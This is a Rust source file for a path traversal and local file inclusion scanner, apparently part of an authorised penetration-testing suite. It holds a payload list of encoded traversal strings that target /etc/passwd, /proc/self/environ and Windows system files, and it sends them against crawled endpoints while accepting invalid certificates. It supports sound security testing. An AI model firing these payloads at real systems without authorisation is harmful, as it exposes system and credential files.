/*******************************************************************
 * Filename:        traversal.rs
 * Author:          Jeff
 * Date:            2026-05-17
 * Description:     mg-traversal — path traversal / LFI detection
 *                  Probes URL path segments and GET parameters with
 *                  traversal sequences; detects file disclosure in responses.
 * Notes:           Only injects into params whose names suggest file handling
 *                  or path segments that look like filenames (contain a dot).
 *                  Probes run concurrently via JoinSet with bounded ceiling.
 *******************************************************************/

use std::fs;
use std::path::Path;

use anyhow::{Context, Result};
use clap::Parser;
use serde::{Deserialize, Serialize};
use time::OffsetDateTime;
use time::format_description::well_known::Rfc3339;
use tokio::task::JoinSet;

use engagement::{Engagement, FindingSeverity, ToolFinding, write_finding};

// ── Constants ────────────────────────────────────────────────────────────────

const OUTPUT_SUBDIR: &str = "traversal";
const AUDIT_TOOL: &str = "mg-traversal";

// GET parameter names that suggest file path injection
const FILE_PARAM_NAMES: &[&str] = &[
    "file", "path", "dir", "filename", "page", "document", "template", "include",
];

// Traversal payloads covering encoding variants and OS targets
const TRAVERSAL_PAYLOADS: &[&str] = &[
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "....//....//....//etc/passwd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "../../../../windows/win.ini",
    "../../../../windows/system32/drivers/etc/hosts",
    "/etc/passwd",
    "/proc/self/environ",
];

// Strings that confirm file disclosure in the response body
const LINUX_MARKERS: &[&str] = &["root:x:0:0"];
const WINDOWS_MARKERS: &[&str] = &["[fonts]", "[extensions]"];

// ── CLI ──────────────────────────────────────────────────────────────────────

#[derive(Parser, Debug)]
pub struct Args {
    /// Engagement name (must have crawl output)
    engagement: String,

    /// Engagements root directory
    #[arg(long, env = "MG_ENGAGEMENTS_DIR", default_value = "engagements")]
    engagements_dir: String,

    /// Maximum concurrent probes
    #[arg(long, default_value_t = 10)]
    concurrency: usize,

    /// HTTP timeout in seconds
    #[arg(long, default_value_t = 15)]
    timeout: u64,
}

// ── Data types ───────────────────────────────────────────────────────────────

// Mirrors the EndpointMatch shape written by mg-crawl
#[derive(Deserialize)]
struct EndpointMatch {
    path: String,
    #[serde(default)]
    params: Vec<String>,
    #[serde(default = "default_method")]
    method: String,
}

// Injectable point for traversal testing
#[derive(Debug, Clone)]
struct InjectablePoint {
    base_url: String,
    param: String,
}

#[derive(Debug, Serialize, PartialEq, Eq)]
enum TraversalVerdict {
    Confirmed,
    Miss,
}

// Result of one traversal probe
#[derive(Debug, Serialize)]
struct TraversalResult {
    url: String,
    param: String,
    payload: String,
    verdict: TraversalVerdict,
    body_snippet: String,
}

// Top-level output written to disk
#[derive(Serialize)]
struct TraversalResults {
    engagement: String,
    timestamp: String,
    probes: usize,
    confirmed: usize,
    results: Vec<TraversalResult>,
}

// ── Helpers ──────────────────────────────────────────────────────────────────

// Return default HTTP method for deserialization
fn default_method() -> String {
    "GET".to_string()
}

// Return current UTC timestamp as RFC 3339
fn now_rfc3339() -> String {
    OffsetDateTime::now_utc()
        .format(&Rfc3339)
        .unwrap_or_else(|_| "unknown".into())
}

// Sanitize timestamp for filename use (colons → underscores)
fn ts_for_filename(ts: &str) -> String {
    ts.chars().map(|c| if c == ':' { '_' } else { c }).collect()
}

// Return true if the param name suggests file path injection
fn is_file_param(name: &str) -> bool {
    let lower = name.to_lowercase();
    FILE_PARAM_NAMES.iter().any(|n| lower == *n)
}

// Return true if a path segment looks like a filename (contains a dot)
fn segment_looks_like_filename(segment: &str) -> bool {
    segment.contains('.')
}

// Collect injectable points from crawl host directories
fn collect_injectable_points(crawl_dir: &Path) -> Vec<InjectablePoint> {
    let mut points = Vec::new();
    let Ok(hosts) = fs::read_dir(crawl_dir) else {
        return points;
    };
    for entry in hosts.flatten() {
        if !entry.file_type().map(|t| t.is_dir()).unwrap_or(false) {
            continue;
        }
        let ep_path = entry.path().join("endpoints.json");
        let Ok(raw) = fs::read_to_string(&ep_path) else {
            continue;
        };
        let Ok(eps): Result<Vec<EndpointMatch>, _> = serde_json::from_str(&raw) else {
            continue;
        };
        for ep in eps {
            if ep.method != "GET" {
                continue;
            }
            let base = ep.path.split('?').next().unwrap_or(&ep.path);

            // Inject into path segments that look like filenames
            for segment in base.split('/') {
                if segment_looks_like_filename(segment) && !segment.is_empty() {
                    // Replace the segment in the URL path for injection
                    points.push(InjectablePoint {
                        base_url: base.to_string(),
                        param: format!("__path_segment::{segment}"),
                    });
                }
            }

            // Inject into qualifying GET parameters
            for param in &ep.params {
                if is_file_param(param) {
                    points.push(InjectablePoint {
                        base_url: base.to_string(),
                        param: param.clone(),
                    });
                }
            }
        }
    }
    points
}

// Check response body for traversal disclosure markers
fn detect_disclosure(body: &str) -> bool {
    LINUX_MARKERS.iter().any(|m| body.contains(m))
        || WINDOWS_MARKERS.iter().any(|m| body.contains(m))
}

// Build the injected URL for a given point and payload
fn build_url(point: &InjectablePoint, payload: &str) -> String {
    if let Some(segment) = point.param.strip_prefix("__path_segment::") {
        // Replace the segment in the path with the payload
        point.base_url.replacen(segment, payload, 1)
    } else {
        format!("{}?{}={}", point.base_url, point.param, payload)
    }
}

// Send one GET with a traversal payload; return (body)
async fn send_probe(client: &reqwest::Client, url: &str) -> String {
    match client.get(url).send().await {
        Ok(resp) => resp.text().await.unwrap_or_default(),
        Err(_) => String::new(),
    }
}

// Probe one injectable point with all traversal payloads; return results
async fn probe_point(client: reqwest::Client, point: InjectablePoint) -> Vec<TraversalResult> {
    let mut results = Vec::new();
    for payload in TRAVERSAL_PAYLOADS {
        let url = build_url(&point, payload);
        let body = send_probe(&client, &url).await;
        let snippet: String = body.chars().take(512).collect();
        let verdict = if detect_disclosure(&body) {
            TraversalVerdict::Confirmed
        } else {
            TraversalVerdict::Miss
        };
        results.push(TraversalResult {
            url,
            param: point.param.clone(),
            payload: payload.to_string(),
            verdict,
            body_snippet: snippet,
        });
    }
    results
}

// ── Entry point ──────────────────────────────────────────────────────────────

pub async fn run(args: Args) -> Result<()> {
    let eng = Engagement::load_named(Path::new(&args.engagements_dir), &args.engagement)
        .with_context(|| format!("load engagement {}", args.engagement))?;

    let points = collect_injectable_points(&eng.crawl_dir());
    if points.is_empty() {
        anyhow::bail!(
            "no injectable points found — run `mg-crawl {}` first",
            args.engagement
        );
    }

    eprintln!(
        "mg-traversal: {} injectable points, concurrency={}",
        points.len(),
        args.concurrency
    );

    let auth_headers = session::get_auth_headers(&eng)
        .await
        .context("load session auth headers")?;

    let client = reqwest::Client::builder()
        .timeout(std::time::Duration::from_secs(args.timeout))
        .default_headers(auth_headers)
        .danger_accept_invalid_certs(true)
        .build()
        .context("build HTTP client")?;

    let mut join_set: JoinSet<Vec<TraversalResult>> = JoinSet::new();
    let mut all_results: Vec<TraversalResult> = Vec::new();

    for point in points {
        // Drain when at concurrency ceiling
        if join_set.len() >= args.concurrency
            && let Some(Ok(mut rs)) = join_set.join_next().await
        {
            all_results.append(&mut rs);
        }
        let c = client.clone();
        join_set.spawn(probe_point(c, point));
    }
    while let Some(Ok(mut rs)) = join_set.join_next().await {
        all_results.append(&mut rs);
    }

    // Print confirmed findings
    for r in &all_results {
        if r.verdict == TraversalVerdict::Confirmed {
            eprintln!(
                "  [traversal-confirmed] {} param={} payload={}",
                r.url, r.param, r.payload
            );
        }
    }

    let confirmed = all_results
        .iter()
        .filter(|r| r.verdict == TraversalVerdict::Confirmed)
        .count();

    let ts = now_rfc3339();
    let ts_file = ts_for_filename(&ts);

    let output = TraversalResults {
        engagement: args.engagement.clone(),
        timestamp: ts.clone(),
        probes: all_results.len(),
        confirmed,
        results: all_results,
    };

    let output_dir = eng.root.join(OUTPUT_SUBDIR);
    fs::create_dir_all(&output_dir).context("create traversal output dir")?;

    let results_path = output_dir.join(format!("results-{ts_file}.json"));
    fs::write(
        &results_path,
        serde_json::to_string_pretty(&output).unwrap_or_default(),
    )
    .context("write traversal results JSON")?;

    eprintln!(
        "mg-traversal: confirmed={} — {}",
        output.confirmed,
        results_path.display()
    );

    // Write finding for each confirmed path traversal result
    for r in output
        .results
        .iter()
        .filter(|r| r.verdict == TraversalVerdict::Confirmed)
    {
        let tf = ToolFinding::new("mg-traversal", "Path Traversal / Local File Inclusion", FindingSeverity::High)
            .url(r.url.clone())
            .parameter(r.param.clone())
            .evidence(format!("payload={}", r.payload))
            .recommendation("Validate and canonicalize file paths server-side; restrict accessible directories with a chroot or allowlist");
        let _ = write_finding(&eng, &tf);
    }

    let _ = eng.audit(
        AUDIT_TOOL,
        &eng.meta.target,
        Some(&format!(
            "probes={} confirmed={} ts={ts}",
            output.probes, output.confirmed
        )),
    );

    Ok(())
}

// ── Tests ─────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn file_param_names_recognized() {
        assert!(is_file_param("file"));
        assert!(is_file_param("path"));
        assert!(is_file_param("filename"));
        assert!(is_file_param("include"));
    }

    #[test]
    fn non_file_param_not_recognized() {
        assert!(!is_file_param("id"));
        assert!(!is_file_param("user"));
        assert!(!is_file_param("q"));
    }

    #[test]
    fn segment_with_dot_is_filename_like() {
        assert!(segment_looks_like_filename("report.pdf"));
        assert!(segment_looks_like_filename("index.html"));
    }

    #[test]
    fn segment_without_dot_is_not_filename_like() {
        assert!(!segment_looks_like_filename("api"));
        assert!(!segment_looks_like_filename("users"));
    }

    #[test]
    fn linux_disclosure_detected() {
        let body = "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1";
        assert!(detect_disclosure(body));
    }

    #[test]
    fn windows_disclosure_detected_fonts() {
        let body = "[fonts]\ncharset=00";
        assert!(detect_disclosure(body));
    }

    #[test]
    fn windows_disclosure_detected_extensions() {
        let body = "[extensions]\nsome=value";
        assert!(detect_disclosure(body));
    }

    #[test]
    fn clean_body_not_detected() {
        let body = "<html><body>404 Not Found</body></html>";
        assert!(!detect_disclosure(body));
    }

    #[test]
    fn build_url_for_query_param() {
        let point = InjectablePoint {
            base_url: "https://example.com/view".to_string(),
            param: "file".to_string(),
        };
        let url = build_url(&point, "../../../etc/passwd");
        assert_eq!(url, "https://example.com/view?file=../../../etc/passwd");
    }

    #[test]
    fn build_url_for_path_segment() {
        let point = InjectablePoint {
            base_url: "https://example.com/files/report.pdf".to_string(),
            param: "__path_segment::report.pdf".to_string(),
        };
        let url = build_url(&point, "../../../etc/passwd");
        assert_eq!(url, "https://example.com/files/../../../etc/passwd");
    }

    #[test]
    fn ts_for_filename_replaces_colons() {
        assert_eq!(
            ts_for_filename("2026-05-17T12:00:00Z"),
            "2026-05-17T12_00_00Z"
        );
    }
}
